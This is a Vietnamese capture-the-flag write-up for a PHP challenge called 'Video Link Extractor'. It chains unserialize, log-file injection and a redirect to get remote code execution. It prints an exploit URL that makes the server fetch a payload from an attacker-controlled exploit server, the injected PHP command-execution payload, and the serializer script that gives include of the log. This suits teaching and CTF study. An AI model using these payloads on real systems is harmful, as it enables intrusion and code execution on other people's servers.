- Tiêu đề: Video Link Extractor
- Nội dung: unserialize to rce 

- Đây là 1 bài liên quan đến unserialize trong php hay. bài làm rất logic và liên kết :v
- Cũng mất rất nhiều time để nghĩ hướng vì thấy đúng là có lỗi nhưng không biết khai thác kiểu gì, cũng may là ctf source nhỏ đọc lâu cũng hết chữ
- Tổng qua thì có rất nhiều hàm hữu ích trong dạng lỗi serialize như _wakeup(), __toString nhưng lại không gọi function nguy hiểm nào cả

- Phân tích qua source, file index.php trước

![Alt text](<../image/55.1.png>)

- Có 2 feature chính là extract và redirect thì cứ để thực thi url sẽ có dạng
+ case extract: ?mode=extract&id=test&host=local
+ case redirect: ?mode=redirect$url=https://hackerga.com

![Alt text](<../image/55.4.png>)

- Thầy mình dạy unserialize thì hên xui rce vì không chắc nó gọi hàm nguy hiểm và đọc qua hết code duy chỉ có __wakeup có include
-> phải include 1 file có code php do mình kiểm soát
- Đi tiếp ta sẽ thấy có 1 hàm ghi error log 

![Alt text](<../image/55.2.png>)
![Alt text](<../image/55.3.png>)

- Nếu bạn chọn giá trị của host khác với 3 cái mặc định error log sẽ được ghi và biến $host do mình kiểm soát nên inject được
- Tên file là hàm time() nên hoàn toàn dự đoán được đường dẫn file log đó
- Bạn có thể nhanh tay nhanh mắt như sau 
![Alt text](<../image/55.6.png>)

- Thời gian cứ +- 1 là đẹp 

- Vậy làm sao để gọi đến __wakeup() bắt nó thực thi include file log này (vì trong index.php biến _file là cố định)
- Tiếp tục đọc source 
![Alt text](<../image/55.5.png>)

- Có Unserialize data -> có thể thao túng __wakeup() (nhưng như node mình làm đầu khá khó thao túng vimeo nó bắt nạp card mới cho up video)
- Vậy chỉ còn case local (biến id truyền thằng dễ inject) nhưng local của họ làm sao thao túng được kết quả trả về 
- Cùng nhìn lại file index còn 1 case redirect nữa chưa hề động tới 
- Giờ ta bắt local redirect lấy data từ 1 web do mình kiểm soát thì sao kiểu:
+ http://localhost:1337/?mode=extract&id=%3fmode%3dredirect%26url=https://exploit-0a41007304a36ee8833c5e2f010e00fd.exploit-server.net/exploit.txt&host=local
-> nó sẽ extract và thực thi file_get_contents(http://localhost:1337%3fmode%3dredirect%26url=https://exploit-0a41007304a36ee8833c5e2f010e00fd.exploit-server.net/exploit.txt) -> lại lặp lại và redirect get data từ web của mình 

![Alt text](<../image/55.7.png>)
![Alt text](<../image/55.8.png>)

- Họ chặn khá nhiều kí tự nên phải bypass <?=`tail flag.php`?>

- Dưới đây là cách tạo serialize để dùng include với file log của hàm __wakeup() và cách mình dùng web exploit free :v
```
<?php

class Utils
{
    public $_file = '/tmp/1700598448.log'; // File bạn muốn include
    public $_id ;
    public $_host;
    public $_result;

    public function __wakeup()
    {
        try {
            // Kiểm tra xem định dạng file có tồn tại không?
            include $this->_file;
        } catch (Exception $e) {
            throw $e;
        }
    }

    public function extract_api_to_object()
    {
        // Cài đặt cho extract_api_to_object
    }

    public function extract_video_information()
    {
        // Cài đặt cho extract_video_information
    }

    public function __toString()
    {
        try {
            // Lấy chuỗi định dạng
            include $this->_file;
            return sprintf($format_string, $this->_result['title'], $this->_result['description'], $this->_result['thumbnails']);
        } catch (Exception $e) {
            throw $e;
        }
    }
}

$utils = new Utils();
$serialized = serialize($utils);
echo $serialized;
?>

```

![Alt text](<../image/55.9.png>)

#hackerga2101:
- 1 bài hay